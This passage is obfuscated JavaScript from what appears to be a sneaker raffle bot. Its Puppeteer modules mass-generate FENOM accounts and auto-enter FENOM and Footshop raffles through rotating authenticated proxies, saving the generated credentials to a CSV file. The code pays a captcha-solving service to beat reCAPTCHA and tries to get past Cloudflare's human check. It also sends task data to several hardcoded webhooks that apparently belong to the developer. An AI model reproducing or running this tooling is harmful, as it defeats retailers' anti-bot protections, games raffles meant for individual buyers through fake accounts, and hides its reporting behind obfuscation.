_0x589b90['type']('#postcode', '' + _0x254594[_0x6ceb72]['Zip']), await _0x207ff4(0x1f4), await _0x589b90['type']('#city', '' + _0x254594[_0x6ceb72]['City']), await _0x207ff4(0x1f4), await _0x589b90['type']('#telephone', '' + _0x254594[_0x6ceb72]['Phone']), await _0x207ff4(0x1f4), await _0x589b90['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x207ff4(0x9c4);
                            try {
                                await _0x589b90['type']('#instagram_name', '' + _0x254594[_0x6ceb72]['Follower']), await _0x589b90['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x207ff4(0x5dc);
                            try {
                                await _0x589b90['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x207ff4(0x5dc), await _0x589b90['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4b3c67 => _0x4b3c67['click']()), await _0x207ff4(0x1388);
                            try {
                                await _0x589b90['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x589b90['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x254594[_0x6ceb72]['Size'] != 'RANDOM') {
                                    var _0x234be4 = _0x254594[_0x6ceb72]['Size']['replace']('.', ',');
                                    const _0x26ced3 = await _0x589b90['$x']('//div[contains(text(),\x20' + _0x234be4 + ')]');
                                    await _0x26ced3[0x0]['click']();
                                } else {
                                    const _0x509485 = await _0x589b90['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x436e5a = Math['round'](Math['random']() * (_0x509485['length'] - 0x1));
                                    await _0x509485[_0x436e5a]['click']();
                                }
                                await _0x207ff4(0x5dc);
                                try {
                                    await _0x589b90['hover']('#instagram_name'), await _0x589b90['type']('#instagram_name', '' + _0x254594[_0x6ceb72]['Follower']), await _0x589b90['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Retrying'), await _0x589b90['hover']('.checkBox_boxHolder__wLGVe'), await _0x207ff4(0x5dc), await _0x589b90['click']('.checkBox_boxHolder__wLGVe'), await _0x207ff4(0x157c), await _0x589b90['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5810e4 => _0x5810e4['click']()), await _0x207ff4(0x1388), await _0x589b90['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x2a85fc = 'no', _0x40845b(_0x254594[_0x6ceb72], _0x18aff8), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x1977f3 = await _0x1653b0(_0x254594[_0x6ceb72], _0x18aff8, 'dev', ![]), _0x3ab846 = await _0x1653b0(_0x254594[_0x6ceb72], _0x18aff8, 'pub', ![]);
                            const _0x32141c = {
                                'succesDEVMSG': { 'embeds': [_0x1977f3] },
                                'succesPUBMSG': { 'embeds': [_0x3ab846] }
                            };
                            try {
                                _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x32141c['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x32141c['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0xcaa949, _0x32141c['succesPUBMSG']);
                            } catch (_0x5c2ed3) {
                                console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5c2ed3));
                            }
                        } catch (_0x29e4e1) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20' + _0x29e4e1)), _0x2a85fc = 'yes', _0x30db7d = '' + _0x29e4e1;
                            var _0x1ae219 = await _0x1653b0(_0x254594[_0x6ceb72], _0x18aff8, 'dev', !![], _0x30db7d), _0x1977f3 = await _0x1653b0(_0x254594[_0x6ceb72], _0x18aff8, 'dev', ![]), _0x3ab846 = await _0x1653b0(_0x254594[_0x6ceb72], _0x18aff8, 'pub', ![]);
                            const _0xd8f757 = {
                                'succesDEVMSG': { 'embeds': [_0x1977f3] },
                                'succesPUBMSG': { 'embeds': [_0x3ab846] }
                            };
                            _0xd8f757['errorDEV'] = { 'embeds': [_0x1ae219] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0xd8f757['errorDEV']), await _0xf7d9ce(_0x227865, _0xd8f757['errorDEV']);
                        } finally {
                            _0x39fc6c['close']();
                            if (_0x2a85fc == 'yes' && _0x288ca0 != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Retrying')), _0x6ceb72 = _0x6ceb72 - 0x1, _0x288ca0 = _0x288ca0 + 0x1;
                                continue;
                            }
                            _0x2a85fc == 'yes' && _0x288ca0 >= 0x5 && (_0x3fbd0e(_0x254594[_0x6ceb72], _0x18aff8), _0x2a85fc = 'no', _0x288ca0 = 0x0), console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2a4815, _0x458b32, _0x249e68) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x136dfd = 0x0; _0x136dfd < _0x458b32['length']; _0x136dfd++) {
                        if (_0x35c14f != 'yes')
                            var _0x35c14f = '', _0x18f822 = 0x0;
                        var _0x52e39d;
                        await _0x5e3796(_0x458b32, _0x136dfd), _0x2164fd(_0x2a4815['name'] + '\x20Task\x20' + (_0x136dfd + 0x1) + '\x20/\x20' + _0x458b32['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
                        var _0x308a0b = await _0x1653b0(_0x458b32[_0x136dfd], _0x2a4815, 'acc', ![]);
                        const _0x48b9b6 = { 'succesDEVMSG': { 'embeds': [_0x308a0b] } }, _0x423381 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5515a7 = Math['round'](Math['random']() * (_0x249e68['length'] - 0x1)), _0x164471 = _0x249e68[_0x5515a7]['split'](':'), _0x59bd64;
                        try {
                            _0x59bd64 = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x164471[0x0] + ':' + _0x164471[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x59bd64 = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x164471[0x0] + ':' + _0x164471[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x20a444 = await _0x59bd64['newPage']();
                            await _0x20a444['setViewport']({
                                'width': 0x500 + _0x652d(0x1, 0x32),
                                'height': 0x2d9 + _0x652d(0x1, 0x32)
                            });
                            const _0x5ef12c = await _0x20a444['target']()['createCDPSession'](), { windowId: _0x3bc43a } = await _0x5ef12c['send']('Browser.getWindowForTarget');
                            await _0x20a444['authenticate']({
                                'username': '' + _0x164471[0x2],
                                'password': '' + _0x164471[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x20a444['goto']('' + _0x423381, { 'waitUntil': 'networkidle2' }), await _0x207ff4(0x1388), console['log'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x838f57 = await _0x20a444['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x838f57 && await _0x838f57['click']();
                            } catch {
                            }
                            await _0x5ef12c['send']('Browser.setWindowBounds', {
                                'windowId': _0x3bc43a,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x20a444['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x207ff4(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x20a444['type']('input[name=\x22firstname\x22]', '' + _0x458b32[_0x136dfd]['FirstName']), await _0x207ff4(0x1f4), await _0x20a444['type']('input[name=\x22lastname\x22]', '' + _0x458b32[_0x136dfd]['LastName']), await _0x207ff4(0x1f4), await _0x20a444['type']('input[name=\x22email\x22]', '' + _0x458b32[_0x136dfd]['Email']), await _0x207ff4(0x1f4), await _0x20a444['type']('input[name=\x22password\x22]', '' + _0x458b32[_0x136dfd]['Password']), await _0x207ff4(0x258), await _0x20a444['$eval']('input[name=\x22psgdpr\x22]', _0xfa6894 => _0xfa6894['click']()), await _0x207ff4(0x1f4), console['log'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Sending\x20Request'), await _0x20a444['$eval']('#customer-form', _0x18174b => _0x18174b['submit']());
                            try {
                                await _0x20a444['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x35c14f = 'no', console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Account\x20' + _0x458b32[_0x136dfd]['Email'] + '\x20Generated')), _0x71872f['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x458b32[_0x136dfd]['Email'] + ',' + _0x458b32[_0x136dfd]['Password']);
                                try {
                                    _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x48b9b6['succesDEVMSG']);
                                } catch {
                                }
                                await _0xf7d9ce(_0x14fa11, _0x48b9b6['succesDEVMSG']);
                            } catch (_0x36c162) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x36c162);
                            }
                        } catch (_0x3e33ee) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20' + _0x3e33ee)), _0x52e39d = '' + _0x3e33ee;
                            var _0x1b05e1 = await _0x1653b0(_0x458b32[_0x136dfd], _0x2a4815, 'acc', !![], _0x52e39d);
                            _0x48b9b6['errorDEV'] = { 'embeds': [_0x1b05e1] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x48b9b6['errorDEV']), await _0xf7d9ce(_0x227865, _0x48b9b6['errorDEV']), _0x35c14f = 'yes';
                        } finally {
                            _0x59bd64['close']();
                            if (_0x35c14f == 'yes' && _0x18f822 != 0x5 && _0x52e39d != 'Size\x20Not\x20Found') {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Task\x20' + (_0x136dfd + 0x1) + '\x20:\x20Retrying')), _0x136dfd = _0x136dfd - 0x1, _0x18f822 = _0x18f822 + 0x1;
                                continue;
                            }
                            _0x35c14f == 'yes' && _0x18f822 >= 0x5 && (_0x3fbd0e(_0x458b32[_0x136dfd], _0x2a4815), _0x35c14f = 'no', _0x18f822 = 0x0), console['log'](_0x13cc99() + '\x20[' + _0x2a4815['name'] + ']\x20Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0xf8dd69(_0xc1619a, _0x3e0367, _0x29f3d5) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1bb1cb = 0x0; _0x1bb1cb < _0x3e0367['length']; _0x1bb1cb++) {
                        if (_0x478351 != 'yes')
                            var _0x478351 = '', _0x57b584 = 0x0;
                        var _0x4923b4;
                        await _0x5e3796(_0x3e0367, _0x1bb1cb), _0x2164fd(_0xc1619a['name'] + '\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20/\x20' + _0x3e0367['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
                        const _0x1be127 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4a05a0 = Math['round'](Math['random']() * (_0x29f3d5['length'] - 0x1)), _0xf3ca42 = _0x29f3d5[_0x4a05a0]['split'](':'), _0x373ee5;
                        try {
                            _0x373ee5 = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xf3ca42[0x0] + ':' + _0xf3ca42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x373ee5 = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xf3ca42[0x0] + ':' + _0xf3ca42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x38f789 = await _0x373ee5['newPage'](), _0x448539 = await _0x38f789['target']()['createCDPSession'](), { windowId: _0x432b05 } = await _0x448539['send']('Browser.getWindowForTarget');
                            await _0x38f789['authenticate']({
                                'username': '' + _0xf3ca42[0x2],
                                'password': '' + _0xf3ca42[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x38f789['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x207ff4(0xbb8), await _0x448539['send']('Browser.setWindowBounds', {
                                'windowId': _0x432b05,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x207ff4(0x1f40);
                            try {
                                await _0x38f789['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x207ff4(0x1388), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Logging\x20in'), await _0x38f789['type']('input[name=\x22email\x22]', '' + _0x3e0367[_0x1bb1cb]['Email']), await _0x207ff4(0x1f4), await _0x38f789['type']('input[name=\x22password\x22]', '' + _0x3e0367[_0x1bb1cb]['Password']), await _0x207ff4(0x258), await _0x38f789['$eval']('#login-form', _0x3e15a2 => _0x3e15a2['submit']()), await _0x38f789['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x207ff4(0x1f4), await _0x38f789['goto']('' + _0x3e0367[_0x1bb1cb]['Url']), await _0x38f789['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3e0367[_0x1bb1cb]['Size']);
                            if (_0x3e0367[_0x1bb1cb]['Size'] != 'RANDOM') {
                                var _0x229b4d = '\x20' + _0x3e0367[_0x1bb1cb]['Size'] + '\x20';
                                const _0x4b49e6 = await _0x38f789['$x']('//span[contains(text(),\x20' + _0x229b4d + ')]');
                                await _0x4b49e6[0x0]['click']();
                            } else {
                                const _0x2c8bc6 = await _0x38f789['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x3b3465 = Math['round'](Math['random']() * (_0x2c8bc6['length'] - 0x1));
                                await _0x2c8bc6[_0x3b3465]['click']();
                            }
                            await _0x207ff4(0x258), await _0x38f789['click']('#cookieChoiceDismiss'), await _0x207ff4(0x3e8), await _0x38f789['type']('#instagram-account', '' + _0x3e0367[_0x1bb1cb]['Follower']), await _0x207ff4(0x28a), await _0x38f789['click']('#book-btn'), await _0x207ff4(0xbb8), await _0x38f789['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x207ff4(0x1f4), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20' + _0x191fc2['cyan']('Solving\x20Captcha')), await _0x38f789['solveRecaptchas'](), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x207ff4(0x7d0), await _0x38f789['$eval']('#book-btn-for-sure', _0x2ef958 => _0x2ef958['click']()), await _0x207ff4(0x12c), await _0x38f789['click']('#book-btn-for-sure'), await _0x207ff4(0xdac);
                            const _0x13d0f6 = await _0x38f789['$eval']('.reservation-popup\x20>\x20.title', _0x47a6e0 => {
                                return _0x47a6e0['innerHTML'];
                            });
                            if (_0x13d0f6) {
                                _0x478351 = 'no', _0x40845b(_0x3e0367[_0x1bb1cb], _0xc1619a), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x30d1f8 = await _0x1653b0(_0x3e0367[_0x1bb1cb], _0xc1619a, 'dev', ![]), _0x2fa0da = await _0x1653b0(_0x3e0367[_0x1bb1cb], _0xc1619a, 'pub', ![]);
                                const _0xfb2100 = {
                                    'succesDEVMSG': { 'embeds': [_0x30d1f8] },
                                    'succesPUBMSG': { 'embeds': [_0x2fa0da] }
                                };
                                try {
                                    _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0xfb2100['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0xfb2100['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0xcaa949, _0xfb2100['succesPUBMSG']);
                                } catch (_0x2737c3) {
                                    console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2737c3));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x34e78) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20' + _0x34e78)), _0x4923b4 = '' + _0x34e78;
                            var _0x31ca75 = await _0x1653b0(_0x3e0367[_0x1bb1cb], _0xc1619a, 'dev', !![], _0x4923b4), _0x30d1f8 = await _0x1653b0(_0x3e0367[_0x1bb1cb], _0xc1619a, 'dev', ![]), _0x2fa0da = await _0x1653b0(_0x3e0367[_0x1bb1cb], _0xc1619a, 'pub', ![]);
                            const _0x2e5ead = {
                                'succesDEVMSG': { 'embeds': [_0x30d1f8] },
                                'succesPUBMSG': { 'embeds': [_0x2fa0da] }
                            };
                            _0x2e5ead['errorDEV'] = { 'embeds': [_0x31ca75] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x2e5ead['errorDEV']), await _0xf7d9ce(_0x227865, _0x2e5ead['errorDEV']), _0x34e78 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x478351 = 'yes');
                        } finally {
                            _0x373ee5['close']();
                            if (_0x478351 == 'yes' && _0x57b584 != 0x5 && _0x4923b4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Task\x20' + (_0x1bb1cb + 0x1) + '\x20:\x20Retrying')), _0x1bb1cb = _0x1bb1cb - 0x1, _0x57b584 = _0x57b584 + 0x1;
                                continue;
                            }
                            _0x478351 == 'yes' && _0x57b584 >= 0x5 && (_0x3fbd0e(_0x3e0367[_0x1bb1cb], _0xc1619a), _0x478351 = 'no', _0x57b584 = 0x0), console['log'](_0x13cc99() + '\x20[' + _0xc1619a['name'] + ']\x20Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x2638d8, _0x56ed97, _0x21d7c7) {
                _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5a0dc7['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xb4c600 = 0x0; _0xb4c600 < _0x56ed97['length']; _0xb4c600++) {
                    var _0x2517d3;
                    if (_0x382a35 != 'yes')
                        var _0x382a35 = '', _0x3361c7 = 0x0;
                    var _0xcfe28a = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1d42cd
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x56ed97[_0xb4c600]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x56ed97[_0xb4c600]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5a0dc7['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2071e6
                            }
                        ]
                    }], _0xa60f75 = await _0x1653b0(_0x56ed97[_0xb4c600], _0x2638d8, 'dev', ![]), _0x2572ad = await _0x1653b0(_0x56ed97[_0xb4c600], _0x2638d8, 'pub', ![]);
                    const _0x39294f = {
                        'succesDEVMSG': { 'embeds': [_0xa60f75] },
                        'succesPUBMSG': { 'embeds': [_0x2572ad] }
                    }, _0x10c648 = { 'embeds': _0xcfe28a };
                    await _0x5e3796(_0x56ed97, _0xb4c600);
                    if (_0x56ed97[_0xb4c600]['Email'] == '' || _0x56ed97[_0xb4c600]['FirstName'] == '' || _0x56ed97[_0xb4c600]['LastName'] == '' || _0x56ed97[_0xb4c600]['Country'] == '' || _0x56ed97[_0xb4c600]['Size'] == '' || _0x56ed97[_0xb4c600]['Address1'] == '' || _0x56ed97[_0xb4c600]['Zip'] == '') {
                        console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x56ed97[_0xb4c600]['Email'] == '' || _0x56ed97[_0xb4c600]['FirstName'] == '' || _0x56ed97[_0xb4c600]['LastName'] == '' || _0x56ed97[_0xb4c600]['Country'] == '' || _0x56ed97[_0xb4c600]['Size'] == '' || _0x56ed97[_0xb4c600]['Address1'] == '' || _0x56ed97[_0xb4c600]['Zip'] == '' || _0x56ed97[_0xb4c600]['Phone'] == '') {
                        console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x382f84 = '' + _0x56ed97[_0xb4c600]['Url'];
                    if (_0x5a0dc7['useRandomProxy'] = ![])
                        var _0x53135d = _0x21d7c7[_0xb4c600]['split'](':');
                    else
                        var _0x152268 = Math['round'](Math['random']() * (_0x21d7c7['length'] - 0x1)), _0x53135d = _0x21d7c7[_0x152268]['split'](':');
                    const _0x13f67a = await _0x512dd9['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x53135d[0x0] + ':' + _0x53135d[0x1]]
                    });
                    try {
                        const _0x368042 = await _0x13f67a['newPage']();
                        await _0x368042['authenticate']({
                            'username': '' + _0x53135d[0x2],
                            'password': '' + _0x53135d[0x3]
                        }), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x368042['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x368042['setRequestInterception'](!![]), _0x368042['on']('request', _0x53d59c => {
                            _0x53d59c['resourceType']() === 'image' || _0x53d59c['resourceType']() === 'font' || _0x53d59c['resourceType']() === 'media' ? _0x53d59c['abort']() : _0x53d59c['continue']();
                        }), await _0x368042['goto'](_0x382f84), await _0x207ff4(0xbb8), await _0x368042['waitForSelector']('.control__JhutY'), await _0x368042['click']('.control__JhutY'), await _0x207ff4(0x1f4);
                        if (_0x56ed97[_0xb4c600]['Size'] != 'RANDOM')
                            try {
                                const _0x308ed4 = await _0x368042['$x']('//div[contains(text(),\x20\x27' + _0x56ed97[_0xb4c600]['Size'] + '\x27)]');
                                await _0x308ed4[0x0]['click']();
                            } catch {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x10db82 = await _0x368042['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xc37709 = Math['round'](Math['random']() * (_0x10db82['length'] - 0x1));
                            await _0x10db82[_0xc37709]['click']();
                        }
                        await _0x207ff4(0x4b0);
                        const _0x149cfb = await _0x368042['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x149cfb[0x0]['click'](), await _0x368042['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x368042['type']('input[name=\x22email\x22]', '' + _0x56ed97[_0xb4c600]['Email']), await _0x207ff4(0x640), await _0x368042['type']('input[name=\x22phone\x22]', '' + _0x56ed97[_0xb4c600]['Phone']), await _0x207ff4(0x4b0), await _0x368042['click']('button.btn.continue-button__1RtsS'), await _0x207ff4(0x4b0);
                        try {
                            await _0x368042['type']('input[name=\x22firstName\x22]', '' + _0x56ed97[_0xb4c600]['FirstName']), await _0x207ff4(0x258);
                        } catch {
                            const _0x103385 = await _0x368042['$$eval']('.invalid-feedback\x20>\x20div', _0x4853eb => {
                                return _0x4853eb['map'](_0x4e69bd => _0x4e69bd['innerText']);
                            });
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20' + _0x103385));
                            continue;
                        }
